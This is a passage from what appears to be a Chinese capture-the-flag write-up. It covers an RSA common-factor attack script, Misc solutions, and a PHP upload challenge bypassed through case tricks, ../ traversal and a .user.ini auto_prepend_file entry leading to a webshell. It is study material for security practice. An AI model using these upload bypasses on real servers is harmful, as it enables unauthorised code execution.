class="hljs-number">98072970158130557052743501309214730278183672382038608367394969864230458326809973544699153818591268662881322072888566398106950485297090504826503492694322913234760076993549505099324874666504871151866005427564471382493910187132163914206317057765492519429766575635686245134324011521395693486543919737121504564927</span><br>c24 = <span class="hljs-number">84756677608503103260150955220616338703818320766559408023672186987294916281780991760578014562370308440828277618587258867132040493620801006697405228609133125079705806759032776671611044403011814257753860020429845202992660681078110288265705662308669257914929820557756911758703795881131111105735456426318361668270</span><br><br>n25 = <span class="hljs-number">116998704975451649126438110873632899254005035277419492670572774767081897262579095726695238650572133502662066827419600650735798245588760283654510477447046866555500946271925294552225210668772639370759673964276976644621482337217991637452069794612545466451954965844946653644526046333919159857735087230405950562681</span><br>c25 = <span class="hljs-number">16570430676458274583658783537202109532681933818735984083525092301573135300505599596210770719561152272430146209359937832679805615289403307183767153773810188203253348072362271474889040363373962217099743034143761290094400088428924419758901967319662412728935236729324324147218380946513393582503111366654276667293</span><br><br>n26 = <span class="hljs-number">104483514647872589681750539956059559501518691095588994886613956985450502398886043160024956236709333777575620090527433151049744446098751309566470308420565126337409330093064263594492981235416010482005033230034168756644048683563312430985576767247522190417485746094089079663154364989197924484966033401666051619461</span><br>c26 = <span class="hljs-number">17138394314732282449650222032375481084037945506331562281807984251337618581384768104426297000629054857160015466800107548208795134907834277028686324230052715882695049480511887100966333344409478092633916061816340887546660275109537469955682428550280514161676149871928697674125785900970509982522705961063870834979</span><br><br>n27 = <span class="hljs-number">60326311910614696264262112650793534842739976803535002683648803579454544386266984856609414251042150402068441298005137860375797409795047626918641940955705868295020454501701371277588656888843053973492594235436982999278079509091708430758975557632443310088336913237484287616197147486615344814109811864250769004891</span><br>c27 = <span class="hljs-number">40931200129536119129644931618257632169934594051909344741491940855917398274021060980770502436016419647550890030028556565161699377570124309757732051413125103970861589757309665980307809346218599682322773838935146655136803291714871322334463226028263300731552065334923055486898110113638267225092777539580967661120</span><br><br>n28 = <span class="hljs-number">108836390011321379014926001958164364243680734136242582915858471735873222003767956934494616082247251743183741337629538507775710288933884908999105367830098149342315322613209423119780437542382162620154890855931342295730861455417298653702685900413828888060663557808749461673663629805867833592897786982342788685959</span><br>c28 = <span class="hljs-number">49860122961236087518368710991510422129175328759552404964767690481160371914478166882884455554939984467361034583020724163693277920013700619375425377163492358032319254013708661844879532008747012150391247862825829421307678519370594782114030222043646875943001632050368814409623938147284840384891087323572532883863</span><br><br>n29 = <span class="hljs-number">147642880756826434444470720183242575623344222891343187543310266034660755092423898665133531987847110221083466801342989915260094925689296456102030850541466004189380905152669699297642719571249347617034459232200990669150472862070080313969604894517840202856938171221361517095307992345596936784648094656980792830737</span><br>c29 = <span class="hljs-number">92046977118980127142442564723058804191280810807794300193233825843423814612407373128382214212045853881676642579345885635206419186329917252046488467399777210387100456331052575842560395399937360811919422210598686053566713013512136629612761288856067802758730356069125133284822316529263294450339705623303650541612</span><br><br>n30 = <span class="hljs-number">87734299076255924714617453820106124696091797650891616195988933926991162457468764047182100622640315094106172533028675477160048861436573108179533405393174795226635752513805066563332520116258057939800258710771706500516267782437758245192511829394235482408496309979576773935406995172536715298363024533346069346919</span><br>c30 = <span class="hljs-number">62263252640401475318960695726808441962295596142158429394863286841220955664537708906119183631769528596071399577496529459778311142738285615356820914043365948933560441123577579761404940981747532536111256739727969621195235958898220730142554231618489423211995414457014513373452869234957604252970221336539983340072</span><br><br>n31 = <span class="hljs-number">95168052957135885178626832261117079804232648423544525965346024825603884658561493715838419742301304157918975962291479837488430639925193595425591944804055822094003524356965580798499990558645733777026207805801162417237439898941373631234499065453460277052468733038062179112857305187134332721434321449771799966573</span><br>c31 = <span class="hljs-number">47308667329988014529087465185943989650815985557654501979569681083097603969644369844030771441444410365116209805852419087740629267083199189176509773861376488656519367590985625308828158263786736945484737339632978956191304127508915031525569292687193621113966999264598420351091041444022465263533009967538090104901</span><br><br>n32 = <span class="hljs-number">114411145073433113022779564326722850591086774647782899300150137907486262370063613072378664891398298321559199031974310866181210363471975723911866777778770162784631257342290338755862113531477644766476067972283163711314795056112088840338525152673380207315640971316373676167796997813755391889570083582769555559103</span><br>c32 = <span class="hljs-number">94422595978646242385370859519234185285716971843466907323230873050888720783302526415117935769832820271082589144616575676517436641168393833352590277574876283258301184156308459939216124860384928179670520210346849035173195626606754096834809440127939495539537902290299887617625681705583745256724318702438145962169</span><br><br>n33 = <span class="hljs-number">95479078167944012555059510194535316700724634892833216872215244225865604624747266739645717141828585085019926083587368486910129688910884679317631716166480652140861382210591129454338475212950770552050475815284838056686348436934865994292725841850312050347693728526187676352510853618070377328882007450669852024067</span><br>c33 = <span class="hljs-number">45982751479143673997045605834122952252425215373240723816593939944209409478475972946079190389743757924303865876514515981660955111210625161445971304646183507301105269006602145715411717298196867795684625232475162257873600441071166167581905690570819559110937048405959184291973185816886576321872073629520027933109</span><br><br>n34 = <span class="hljs-number">104210978136595230891087798676367564823753206514856021196375425772745699072487908076016311602695745154349859462737817439238614793440776356373265528586980469884184707529198466626483692318329436310471573158231593900056091507816703811713617547371376944611174717451275120901898700134871914684744133375045083974559</span><br>c34 = <span class="hljs-number">47795890018312771415042345069340623608208640670842813420097975422251308044096964274135251807688060722467290219083318980053947501924058955107468568628695877672501235831125177972779208595710594858788771405413808960375103289445718484753806431277618590577002568794014665029007522547246875640296273255471027746174</span><br><br>n35 = <span class="hljs-number">124900226916008255291364823427932270688510422097938162661205956484918846565343556390509970236724043293296270349255397548674255755736775721401583808983028413293950374478174908210743176930820078213911296986905209176239030646665342756766665656798693942784289547500890598570625257574834144161908220090513607100443</span><br>c35 = <span class="hljs-number">69687098984633733075280717007587203818312950246289738071141776045422637587297945727527258833596780023616592412869727844602694777579783707102049282895045427781576648624111949234897892934958565410274547056762375405558949445944961270752443153415695633314374042157534903100601349529735209374183246418467507261678</span><br><br>n36 = <span class="hljs-number">106076461689740364509547983234550083419491598858439281865012707231490098640181388950259650519845227256038061169481367312244216059487641941663897149853760510043653747481760729965852665972680183551345973379645844201094479192927941808230165011051745283319434738229025415306651624552661593145968829146009528204139</span><br>c36 = <span class="hljs-number">49265710428903305060640098658868900623042892220055083681800681636693217103754657961211688101393980802485486994767600500130501790099820636158227682077483275519434004553444062288968146281353744052370298988361041739971609762483097545691128944207477091466023637243001938492115731909427849297711486130876631104199</span><br><br>n37 = <span class="hljs-number">102962829720771882197749256670336589357311132436261490004396772895006384277874667395420850357722988048941437978183999217447648123296439722730055980585935615891138197537072428082144801107174501380609741843220821085775200534747761633269518926910390413273344760450125150389251771046927241876033660426522558543099</span><br>c37 = <span class="hljs-number">27781362665688824165016862953510332480542293818004472225574029238124263287391117238506191501951396870358266502368695220080425450119808769180065196569973906172552505849961213824318575099643862453287436796754580954469690531286909858759254426336535934955118131726082983730605020636892038993734701758861726813917</span><br><br>n38 = <span class="hljs-number">73856953558568922866065269006785075537460094024399704360714920414994378603564606431481975815209474306251824674589466430959132648739341353797951609730777823223231201000238065040131404182984196612368806918632439249661194393025640075280971803068966303374536384766382205539061910067068706562997455112740019131141</span><br>c38 = <span class="hljs-number">51915893879955490253802566958190047213763169433955095339957337049322539987200895203998502264798668768412922087182570714987156269462095705471944455611913005794278946564787522329048202985918435716894853328571194687387853787530720415846161416416757464376941214309484833893359116013087534027228501529765756907692</span><br><br>n39 = <span class="hljs-number">65680214781438239555281960634195867835139324061180765322384486454047655097115706363891153450590534574351578810199984914495173275168206748586690680272761313448935092560918627591896139791469443972993979003054600865154011978228594047714049604578365127852096951779635039890953169546467866563266332296396871076589</span><br>c39 = <span class="hljs-number">7684074671551210406583011634674519674891094232023770078592205024228244586008047726163330419380257939415877596490356539338012471983951869276015232840717439681128745977907088460407978913598847121925730554331272215687487501421132565249129743606275082527834357490648278977212010985656047607921255565470565331604</span><br><br>n40 = <span class="hljs-number">63731094353225856606884846888435889685724323090116632497321440843471595699500046176243726442543427591048508993828354169603431232430905153081294636987864618130184112836258653457104912385524741899810300045949715807120033969791612530969664910145078555120597496861060797394280764831507105630414699914806363699919</span><br>c40 = <span class="hljs-number">45135268640531572276632359436457117328448215496689754243654316877945919791435143715382831866291594843635227890263474174236403136140577883195807877658173635800169975109646931450935492786999735420639321517460515137029043381757277121855173814947251489703164764744842744697746009656927991552781411603984151236817</span><br><br>n41 = <span class="hljs-number">131288746056753706799251297343925936986513850875832463509780227830988366933051206223718132326720614580110407529508692875317142679411579909002217250676078142722857601045944930987355779316969568475651902390173931010454505887209439626309636041213111385622305466557744171022716506877192050121646433129382313101053</span><br>c41 = <span class="hljs-number">112744066328442409161417689589020315149280389883889756414854898060858251180276709990609763598732918496371494629320774504452520501164750402711455524435663355878780266124470139294032611326343529788023423464481785129539704566759175819861252326272870495129850959767518532226207699355915509845261433422668064158147</span><br><br>n42 = <span class="hljs-number">83676921012282550512303401264397648068621964517656416739307673385591720719332838058073826239369638305284785180049541517570705412715000417863135734806873461343038931768632377619826665184183536387706749007414008584315847709894913964647923203871863375859788911666582003878412457638393407796910907877625937115293</span><br>c42 = <span class="hljs-number">64587468728420247302224575709884332576098583790894153541573792923889723022503636857078795897100243385366764796448591906202736770145726218999885222971394680495632871056756158108672235623119200158547824537286862014033000125072082300400506630117043725123416611633573931158643343196531565638354716489675854822449</span><br><br>n43 = <span class="hljs-number">107030054015087699139519262772728868842593238547433164775729464521772074966846794437736985617483484698270493657545913338804724099411820962705592272173516224837816744344065940618045323765453821555222713203802544489064777242962969716980534278888159088999349126513541701925962726046306864101299436162647297434849</span><br>c43 = <span class="hljs-number">105657897857946314217340002015104160854509295690859274867843856620738133949061691607504418354926641487695855270865093071510546545157325232748207951711619993404044655007664070926272905377478256229789599520152039771250190159992066715349976543013222482138507293430051790459818256070324493596920250504795880801013</span><br><br>n44 = <span class="hljs-number">89473794652379132450673026806587454714920435044408685254946255223602153698392388885033340513553464653246623093560821610679233365263890457633002483146981940013223156160837730360512137871272216866132440912611846386374771080980840088873686178469059518406894496503145465688024812930960266115229230274738114996907</span><br>c44 = <span class="hljs-number">65689611094849937112329541757314052031835941448096718520497381987012868452392824902099096359643626573053399516769140077760976151549630064035406584674887819668758166204826846540515185341483274907623321234090042322119063963964305382759909537483616842515806481391952678240808768552058510774610984371734780693135</span><br><br>n45 = <span class="hljs-number">97453692360221550525546414966397900446143894547459997755329830448432372475615815486408785701156413698241821262793738783053819570379326736532459084184732138260631432203066922896117238959614888101433738027706461797704480416144648360785799510836716769714953962723460387456296333189732562581166990547142363506233</span><br>c45 = <span class="hljs-number">33635550655164661193638995161087233824832017512985967201561415707708251129505398124555900665283890455320975705071337975407119307598802379191658241415253018875624502985256581953036337649371555147642991393008112919449983360543682982510089879745240084291217521030993180089009138398930133055572314481548375172412</span><br><br>n46 = <span class="hljs-number">72110261011813804504699995241414935772601482660021632643448029482979872141648770058130720101544649293432992047392229209697580021984291543006321973063581200375167771080297142162138791764150457087178800126398919417518959521113749708876779341492672187722724304490254491357939555861470434733012180727444930923711</span><br>c46 = <span class="hljs-number">27594166134185673292363592371705253990545626708181652916737705612435409771022803185867850355650906370335020015065719532239190552005974543128258608957861843949502098170096407325140860639757639486519725463591773910637337455431143451699528477794467589689153369252137201751896811401565591147412597244703389010092</span><br><br>n47 = <span class="hljs-number">78122884671752036823697231362017241332672680262948866914242750297148504000868567535547392055315438687741491499873398302755846466314188891158667604042463240341624935740684029682819183618539622686036495780663875201786101375514678349102491335468261470024752084648870531991551830780272898466768092280177114692051</span><br>c47 = <span class="hljs-number">22421294177445342844160499123464996227038929743160143621730890990404785986808106034340459368178210170899299988065450550451758942626313068047256343624972594655208812912325260242531971656312318955715295109729219376623050265643900569431085543463502701600517143206557385630737929399092415306602699696571768302397</span><br><br>n48 = <span class="hljs-number">84425100372667709081351008608369464999175296018000038343488754222958042215634556280629504014723615236854177488101190111656475845400206225964972957750342381863809504300134945714141421396891682378792869479733182762947319320452457491930448144300445164741177043099949953854515277259329681550088547132519052614231</span><br>c48 = <span class="hljs-number">11025655521651977682718429833120705820173377364466496631786785538536423486092265951037906039713585670763817677532288222631142506222473954443053493542027582069138840121115002083588802596551797766632194064992504962798179294624494090093798337071872500931203935593175946389007083405285716384918518482594838109887</span><br><br>n49 = <span class="hljs-number">76500928140557126951724082173424539634881305472817091417354118419682742078696556369663431631613049814066274893574795062996943022496494748474202712572097857610759669062349068368426767423023209350854968141894400035943508174837015387264409993545082627931903929574033492743333545979438362106170342782167687609107</span><br>c49 = <span class="hljs-number">10835219926693744715226054600570675946129061939860372899995850870803848251070230139723433415534228479787886666269236646256799151316920754649873028710947833002154324632186309684272625729925386497641528810548192349048222027964237850335570477213388434897313533622929497500089961247597050651661308649384027755219</span><br><br>n50 = <span class="hljs-number">139237837960035910646687916167915067040948209141509547478650946545607307041356395829646629075167578370050461042404793555835755850760066875641804762986083112195069377600306026177092911766398745954474513022700897756622714672037989763110412593587869199600384292944312268989774543301753778380746204072143177381803</span><br>c50 = <span class="hljs-number">33504220411103363648905580410433029122727077829225905640294568048202031479149747901779756716491927386579457044024810462816601015130294414372912477229817100700909431649525437858242925058333428108411843766072343017163119495841041661379922012515769877839886403561438085220803145239403402362322100289480854215585</span><br><br>n51 = <span class="hljs-number">117631254440827507711546516112064297632280517928701748229245100878457364480551737782926019390654343902604153923628235107328333591976094811034889142554408478459326139372839799039660101105089383957921866031073451602010280579418535870826966679607043782829521690182490405885737782400118120924577001573078069674031</span><br>c51 = <span class="hljs-number">58081239962080289539906254360700159598142562988604931399068793477666166828020623753926759111646908772270036826511294547686391825720970410679855590857629934979655095269122503464951186999483445309422521312381301676116995685418231618433794023796701393350546134001033470765285941563129008503210305690581496989613</span><br><br>n52 = <span class="hljs-number">87937561818584222067998501919046183164308258733624324874010371260128617446056888141283866305399209040799670381796495556537840654814799948322352233830362809817282857926530760795100851673538109675849767661695723939064163025995368930876760370213927885931816302820132430573906481238739384645306155356045085410659</span><br>c52 = <span class="hljs-number">70353910119492561304997751595660997934725320689030790761785801693780450524401892515867067737335014549634402169552439412696800605971983092191032742128764098307531085732186961054924376068682626009181143856968718386364360024107286218381939928224582669724984430384091177413653359407965960659775462562437234176542</span><br><br>n53 = <span class="hljs-number">121494135008171226375671409329837799191283088835966404651235988073098249092521541975067727645782080146180142892886721427393083831025060337427205569221607867816449951160262349064183736422019180025381395196798309104979993825520850704644518169879717439251166133025991744120758650078599372754647416364880517335673</span><br>c53 = <span class="hljs-number">96124490139950046197016373711525737984644393252464916071851869765516581561747228879613155589524152632714927835422522664757276436023889445499893530783556896318087464112528679849958296550595124327514868543923634490018995647221618964810578099265174507171054978199076057090242189056855571075714794852616323545798</span><br><br>n54 = <span class="hljs-number">104526292983815049511684831813997427004903214666645560631465142732200291577549994915017639978735111413930374038654975595174609015149778366007738397229835387841781838590394212639085516120474654389008329374807038730589684341972751119427397612411672615922118786971783836634736031219403320200067949470717779338699</span><br>c54 = <span class="hljs-number">53525296179404140755501633385909663496959520446349532338066089655637364974852325384104814644355031090153086378349806439008060052338094942063965676095471089115562464095086347506474334963836939247782248394005049426530356395273840846631671561797842282022916588149878401628024484852733784293085112240910154188327</span><br><br>n55 = <span class="hljs-number">137317704472567961216181080342613357343575313301339369342657385964502640491361208642059935501657870555419622774054072740316171355388149247371287529354566408424773867535596523666978660163095211923499777265022567776949469058056517042827298345927459607526976941723109800647277312883369595792063139258023975837323</span><br>c55 = <span class="hljs-number">113303720867154494697852500357644759448043823219362027898143392679102317482970393914011078897636848470883059950298962408807140718310433138772483261345280554971368830760746668022060620713920854476565351976646576658923049862482014555499098631705043425687059066208849299248851416095337775423820369155501159322885</span><br><br>n56 = <span class="hljs-number">88195122611127715769699993202074228583439275399074002854731620357451278444028076944142775479735846117716601737755557363184797776452112641709712005378691288474128773600382499559064846418256103597221189994815759855699913486538095356288852743114692590043927490813123669572257581364238195901785276389260789865577</span><br>c56 = <span class="hljs-number">73913964009633261231270425260232709150784365614098258055822544831515941645318658499733846215504825273856158303254628879328745760493087406690893533322348155485834789131234721750985992230360872015187578363525697927380430712163230460426748704438119078872484248545612497001428621979782856261329367547781437976629</span><br><br>n57 = <span class="hljs-number">99818788432853827881516435738813053368970948426449375954403696637675334637787416053431814853038810508431999771538465684659846469616047111372114534116658459641139992980128530170352284264767800326189782233782433221878169220672158257928668750240537006666128085602962938058892172209765765942353021078760030185953</span><br>c57 = <span class="hljs-number">13143593421545568887272111055115063529148374173183820486709409035817442098891745344379522206872021223575649181389573652563084996604798774432746516486028875436504963657129584534966904738779978150886985100629429482621276787468248225822247548057804822190287563044474710257297044047778366621695067343076196963364</span><br><br>n58 = <span class="hljs-number">89116440537082034096007339508627962600816125152708965763623147352128348135019671068361676714507097261410812750135368513250938490248291964104119444577610856094496131334052241221868309809334184247318379626902790295470783559999213894171508946361861330645509618787654875702411478298395052077750258286567341793673</span><br>c58 = <span class="hljs-number">46410074528345591271442909354540876854983747019275858767049216344398136806600468114887380556148820491781335250695797126664473656392201988003467954211473291229046496035491477334797060560364990926679861729979254282749731190331996675678333827288202990981507079265543866951764809855339704853628775034741057210245</span><br><br>n59 = <span class="hljs-number">107777234085847418525692492751498557116365112676157940027797787247873648173244311790872383690219654416683258064278214402849632274580082036604585774406256951125393538335600201926864361424362038357926057836205766070824072702981890703499274855005758838127054497428174443852066321749376198936319846090446587845901</span><br>c59 = <span class="hljs-number">30873276784655415898639780220317531098555181267748494820177405042365602805037762075274253973737960788943466955887139873827151101823524617479202978233785328439836176883990904681050397810186146666852493436694647111407184239910266131828128455416702697371504649738803269763979849746334027096478051999140264274462</span><br><br>e = <span class="hljs-number">65537</span><br>c = [c0, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11, c12, c13, c14, c15, c16, c17, c18, c19, c20, c21, c22, c23, c24,<br>     c25, c26, c27, c28, c29, c30, c31, c32, c33, c34, c35, c36, c37, c38, c39, c40, c41, c42, c43, c44, c45, c46, c47,<br>     c48, c49, c50, c51, c52, c53, c54, c55, c56, c57, c58, c50]<br>n = [n0, n1, n2, n3, n4, n5, n6, n7, n8, n9, n10, n11, n12, n13, n14, n15, n16, n17, n18, n19, n20, n21, n22, n23, n24,<br>     n25, n26, n27, n28, n29, n30, n31, n32, n33, n34, n35, n36, n37, n38, n39, n40, n41, n42, n43, n44, n45, n46, n47,<br>     n48, n49, n50, n51, n52, n53, n54, n55, n56, n57, n58, n50]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(n)-<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(n)-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> (i != j):<br>            <span class="hljs-keyword">if</span> (gmpy2.gcd(n[i], n[j]) != <span class="hljs-number">1</span>):  <span class="hljs-comment"># 对不同的n进行 欧几里得算法，以求出最大公约数(p)</span><br>                <span class="hljs-built_in">print</span>(i, j)  <span class="hljs-comment"># 输出对应的n的序号</span><br>                p = gmpy2.gcd(n[i], n[j])<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p = &quot;</span>, p)<br>                q = n[i] // p<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;q = &quot;</span>, q)<br>                d = gmpy2.invert(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d = &quot;</span>, d)<br>                m = <span class="hljs-built_in">pow</span>(c[i], d, n[i])<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;m = &quot;</span>, m)<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br><br></code></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="简单签到，关注：”杭师大网安“谢谢喵🐱"><a href="#简单签到，关注：”杭师大网安“谢谢喵🐱" class="headerlink" title="简单签到，关注：”杭师大网安“谢谢喵🐱"></a><strong>简单签到，关注：”杭师大网安“谢谢喵🐱</strong></h3><p>关注公众号回复即可</p><h3 id="你的运气是好是坏？"><a href="#你的运气是好是坏？" class="headerlink" title="你的运气是好是坏？"></a><strong>你的运气是好是坏？</strong></h3><p>队里的Re老直接给出114514的奇怪数字拿下flag（我也不知道为啥CTFER喜欢这个数字）</p><h3 id="next-is-the-end"><a href="#next-is-the-end" class="headerlink" title="next is the end"></a>next is the end</h3><p><img src="/./../img/TGCTF/Misc/1.png"></p><p>将题目给出的压缩包binwalk一下就出来了一堆嵌套的目录</p><p><img src="/./../img/TGCTF/Misc/2.png"></p><p>hint说找到you get it即可得到flag</p><p>直接find梭哈</p><p><img src="/./../img/TGCTF/Misc/3.png"></p><p>cat即可得到flag</p><p><img src="/./../img/TGCTF/Misc/4.png"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ez-upload"><a href="#ez-upload" class="headerlink" title="(ez)upload"></a>(ez)upload</h3><p><img src="/./../img/TGCTF/Web/1.png"></p><p>php文件无法上传</p><p>提示有源码在备份文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UPLOAD_PATH&#x27;</span>, <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/uploads/&#x27;</span>);<br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$status_code</span> = <span class="hljs-number">200</span>; <span class="hljs-comment">// 默认状态码为 200</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php4&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span class="hljs-string">&quot;php2&quot;</span>, <span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;htm&quot;</span>, <span class="hljs-string">&quot;phtml&quot;</span>, <span class="hljs-string">&quot;pht&quot;</span>, <span class="hljs-string">&quot;jsp&quot;</span>, <span class="hljs-string">&quot;jspa&quot;</span>, <span class="hljs-string">&quot;jspx&quot;</span>, <span class="hljs-string">&quot;jsw&quot;</span>, <span class="hljs-string">&quot;jsv&quot;</span>, <span class="hljs-string">&quot;jspf&quot;</span>, <span class="hljs-string">&quot;jtml&quot;</span>, <span class="hljs-string">&quot;asp&quot;</span>, <span class="hljs-string">&quot;aspx&quot;</span>, <span class="hljs-string">&quot;asa&quot;</span>, <span class="hljs-string">&quot;asax&quot;</span>, <span class="hljs-string">&quot;ascx&quot;</span>, <span class="hljs-string">&quot;ashx&quot;</span>, <span class="hljs-string">&quot;asmx&quot;</span>, <span class="hljs-string">&quot;cer&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>, <span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file_name</span>, PATHINFO_EXTENSION);<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$file_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$temp_file</span>);<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?&lt;/s&#x27;</span>, <span class="hljs-variable">$file_content</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件内容包含非法字符，禁止上传！&#x27;</span>;<br>                <span class="hljs-variable">$status_code</span> = <span class="hljs-number">403</span>; <span class="hljs-comment">// 403 表示禁止访问</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-variable">$file_name</span>;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                    <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件上传成功！&#x27;</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>                    <span class="hljs-variable">$status_code</span> = <span class="hljs-number">500</span>; <span class="hljs-comment">// 500 表示服务器内部错误</span><br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;禁止保存为该类型文件！&#x27;</span>;<br>            <span class="hljs-variable">$status_code</span> = <span class="hljs-number">403</span>; <span class="hljs-comment">// 403 表示禁止访问</span><br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>        <span class="hljs-variable">$status_code</span> = <span class="hljs-number">404</span>; <span class="hljs-comment">// 404 表示资源未找到</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 设置 HTTP 状态码</span><br><span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-variable">$status_code</span>);<br><br><span class="hljs-comment">// 输出结果</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<br>    <span class="hljs-string">&#x27;status_code&#x27;</span> =&gt; <span class="hljs-variable">$status_code</span>,<br>    <span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-variable">$msg</span>,<br>]);<br></code></pre></td></tr></table></figure><p>大概看一下waf，有一个列表存放了php的后缀名，但是他直接将我们上传的文件后缀名和array里的比较，这里直接大小写绕过即可，其中对文件内容的过滤感觉没啥作用，并且我们可以传name来给文件命名，并且直接拼接到路径中，这里可以用..&#x2F;目录穿越，本来试图直接访问uploads中上传的马，但是解析不了，并且他过滤了htaccess，那么就只有.user.ini了，把.user.ini传入，name&#x3D;..&#x2F;\.user.ini</p><p>auto_prepend_file&#x3D;123.PHP</p><p><img src="/./../img/TGCTF/Web/4.png"></p><p>显示如此表示.user.ini文件成功生效，方法可行</p><p><img src="/./../img/TGCTF/Web/5.png"></p><p>使用一句话木马即可GetShell</p><h3 id="AAA偷渡阴平"><a href="#AAA偷渡阴平" class="headerlink" title="AAA偷渡阴平"></a><strong>AAA偷渡阴平</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$tgctf2025</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tgctf2025&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span 